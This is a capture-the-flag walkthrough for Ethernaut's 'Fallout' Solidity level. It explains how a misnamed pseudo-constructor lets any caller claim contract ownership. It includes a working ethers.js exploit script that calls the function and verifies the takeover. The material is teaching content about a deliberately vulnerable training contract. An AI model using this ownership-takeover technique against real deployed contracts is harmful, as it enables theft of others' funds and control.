---
description: In Ethernaut's Fallout, we learn a quick lesson about constructor syntax.
---

# 2 - Fallout

To complete [this level](https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5) we need to claim ownership of its `Fallout` contract.

### Hints

<details>

<summary>Hint One</summary>

The only function in the contract that assigns a value to `owner` is its "constructor", `Fal1out`. Is this function really what it seems?

</details>

<details>

<summary>Hint Two</summary>

If Fal1out was a real constructor, this challenge would not be solvable.

</details>

### Full Walkthrough

#### Claiming Ownership

The `owner` of this contract is set in its "constructor" function `Fal1out` and not reassigned elsewhere in the contract. Note that despite being labelled the constructor in the comment above, this function is not actually the valid constructor for this contract and will not run when it is deployed. If it were a valid constructor, there would be no way for us to take ownership of the contract after it was deployed by another address.

```solidity
/* constructor */
function Fal1out() public payable {
  owner = msg.sender;
  allocations[owner] = msg.value;
}
```

In some versions of Solidity prior to 0.4.21, a constructor could be defined by naming a function the same name as its contract. This contract, however, is being compiled as version 0.6.0 or higher, and therefor this "constructor" will not run when the contract is deployed.

```solidity
pragma solidity ^0.6.0;
```

Additionally, it is worth noting that the function name does not actually match the contract's name as the function's second "l" is actually the number 1.

Any address that calls the `Fal1out` function will become the contract's owner.

{% hint style="info" %}
**Transactions and calldata**

Coming soon...
{% endhint %}

### Scripted Solution

```javascript
const fs = require('fs')
const ethers = require('ethers')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const { playerWallet, contract: falloutContract } = await setup('Fallout')

  // Check Fallout contract's owner
  console.log(
    `Fallout contract owner is initially: ${await falloutContract.owner()}`
  )

  // Call Fallout contract's 'Fal1out' function
  console.log("Calling Fallout contract's 'Fal1out' function...")
  const falloutFal1out = await falloutContract.Fal1out()
  await falloutFal1out.wait(1)

  // Check Fallout contract's new owner
  const falloutContractOwner = await falloutContract.owner()
  console.log(`Contract owner is now: ${falloutContractOwner}`)
  console.log(
    `Contract owner is player: ${falloutContractOwner === playerWallet.address}`
  )
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

```

### Key Takeaways

* Some older versions of Solidity allowed for **constructors** to be defined as functions with the **same name as the contract** itself.
* Even a single, simple **syntax error** can become a **security disaster**.
